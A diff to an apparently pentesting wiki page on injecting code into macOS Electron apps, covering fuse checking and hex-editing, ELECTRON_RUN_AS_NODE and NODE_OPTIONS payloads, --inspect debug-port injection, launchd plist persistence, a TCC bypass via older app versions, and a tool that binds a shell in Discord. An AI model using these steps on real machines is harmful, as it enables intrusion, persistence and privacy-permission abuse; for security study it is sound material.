@@ -12,31 +12,28 @@
 
 </details>
 
-## Adding code to Electron Applications
+## Basic Information
 
-The JS code of an Electron App is not signed, so an attacker could move the app to a writable location, inject malicious JS code and launch that app and abuse the TCC permissions.
+If you don't know what Electron is you can find [**lots of information here**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). But for now just know that Electron runs **node**.\
+And node has some **parameters** and **env variables** that can be use to **make it execute other code** apart from the indicated file.
 
-However, the **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
+### Electron Fuses
 
-## Inspect Electron Application
+These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fueses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
 
-According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
-For example:
+* **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
+* **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
+* **`EnableEmbeddedAsarIntegrityValidation`**: If enabled, the loaded **`asar`** **file** will be **validated** by macOS. **Preventing** this way **code injection** by modifying the contents of this file.
+* **`OnlyLoadAppFromAsar`**: If this is enabled, instead of searching to load in the following order: **`app.asar`**, **`app`** and finally **`default_app.asar`**. It will only check and use app.asar, thus ensuring that when **combined** with the **`embeddedAsarIntegrityValidation`** fuse it is **impossible** to **load non-validated code**.
+* **`LoadBrowserProcessSpecificV8Snapshot`**: If enabled, the browser process uses the file called `browser_v8_context_snapshot.bin` for its V8 snapshot.
 
-{% code overflow="wrap" %}
-```bash
-/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
-# Connect to it using chrome://inspect and execute a calculator with:
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
-```
-{% endcode %}
+Another interesting fuse that won't be preventing code injection is:
 
-{% hint style="danger" %}
-Note that now **hardened** Electron applications with **RunAsNode** and **`EnableNodeCliInspectArguments`** are disabled will **ignore node parameters** (such as --inspect) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set.
+* **EnableCookieEncryption**: If enabled, the cookie store on disk is encrypted using OS level cryptography keys.
 
-However, you could still use the electron param `--remote-debugging-port=9229` but the previous payload won't work to execute other processes.
+### Checking Electron Fuses
 
-You can check these flags from an application with:
+You can **check these flags** from an application with:
 
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
@@ -51,27 +48,38 @@ Fuse Version: v1
   OnlyLoadAppFromAsar is Enabled
   LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
-{% endhint %}
 
-## `NODE_OPTIONS`
+### Modifying Electron Fuses
 
-{% hint style="warning" %}
-This env variable would only work if the Electron application hasn't been properly hardened and is allowing it. If hardened, you would also need to use the **env variable `ELECTRON_RUN_AS_NODE`**.
-{% endhint %}
+As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
-With this combination you could store the payload in a different file and execute that file:
+In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 
-{% code overflow="wrap" %}
 ```bash
-# Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
-
-# Execute
-NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
+grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
+Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-{% endcode %}
 
-## `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.
+
+## RCE adding code to Electron Applications
+
+There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.
+
+{% hint style="danger" %}
+However, at the moment there are 2 limitations:
+
+* The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
+* The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`
+
+Making this attack path more complicated (or impossible).
+{% endhint %}
+
+## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
 According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), if this env variable is set, it will start the process as a normal Node.js process.
 
@@ -83,6 +91,12 @@ ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
 {% endcode %}
+
+{% hint style="danger" %}
+If the fuse **`RunAsNode`** is disabled the env var **`ELECTRON_RUN_AS_NODE`** will be ignored, and this won't work.
+{% endhint %}
+
+### Injection from the App Plist
 
 As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
 
@@ -109,6 +123,135 @@ As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third
 </dict>
 </plist>
 ```
+
+## RCE with `NODE_OPTIONS`
+
+You can store the payload in a different file and execute it:
+
+{% code overflow="wrap" %}
+```bash
+# Content of /tmp/payload.js
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+
+# Execute
+NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
+```
+{% endcode %}
+
+{% hint style="danger" %}
+If the fuse **`EnableNodeOptionsEnvironmentVariable`** is **disabled**, the app will **ignore**  the env var **NODE\_OPTIONS** when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+{% endhint %}
+
+### Injection from the App Plist
+
+You could abuse this env variable in a plist to maintain persistence adding these keys:
+
+```xml
+<dict>
+    <key>EnvironmentVariables</key>
+    <dict>
+           <key>ELECTRON_RUN_AS_NODE</key>
+           <string>true</string>
+           <key>NODE_OPTIONS</key>
+           <string>--require /tmp/payload.js</string>
+    </dict>
+    <key>Label</key>
+    <string>com.hacktricks.hideme</string>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+```
+
+## RCE with inspecting
+
+According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
+For example:
+
+{% code overflow="wrap" %}
+```bash
+/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
+# Connect to it using chrome://inspect and execute a calculator with:
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
+```
+{% endcode %}
+
+{% hint style="danger" %}
+If the fuse**`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+
+However, you could still use the electron param `--remote-debugging-port=9229` but the previous payload won't work to execute other processes.
+{% endhint %}
+
+### Injection from the App Plist
+
+You could abuse this env variable in a plist to maintain persistence adding these keys:
+
+```xml
+<dict>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+        <string>--inspect</string>
+    </array>
+    <key>Label</key>
+    <string>com.hacktricks.hideme</string>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+```
+
+## TCC Bypass abusing Older Versions
+
+{% hint style="success" %}
+The TCC daemon from macOS doesn't check the executed version of the application. So if you **cannot inject code in an Electron application** with any of the previous techniques you could download a previous version of the APP and inject code on it as it will still get the TCC privileges.
+{% endhint %}
+
+## Automatic Injection
+
+The tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) can be easily used to **find vulnerable electron applications** installed and inject code on them. This tool will try to use the **`--inspect`** technique:
+
+You need to compile it yourself and can use it like this:
+
+```bash
+# Find electron apps
+./electroniz3r list-apps
+
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║    Bundle identifier                      │       Path                                               ║
+╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
+com.microsoft.VSCode                         /Applications/Visual Studio Code.app
+org.whispersystems.signal-desktop            /Applications/Signal.app
+org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
+com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
+com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
+org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
+com.github.GitHubClient                      /Applications/GitHub Desktop.app
+com.ledger.live                              /Applications/Ledger Live.app
+com.postmanlabs.mac                          /Applications/Postman.app
+com.tinyspeck.slackmacgap                    /Applications/Slack.app
+com.hnc.Discord                              /Applications/Discord.app
+
+# Check if an app has vulenrable fuses vulenrable
+## It will check it by launching the app with the param "--inspect" and checking if the port opens
+/electroniz3r verify "/Applications/Discord.app"
+
+/Applications/Discord.app started the debug WebSocket server
+The application is vulnerable!
+You can now kill the app using `kill -9 57739`
+
+# Get a shell inside discord
+## For more precompiled-scripts check the code
+./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell
+
+/Applications/Discord.app started the debug WebSocket server
+The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
+Shell binding requested. Check `nc 127.0.0.1 12345`
+```
+
+## References
+
+* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
+* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
+* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)
 
 <details>
 
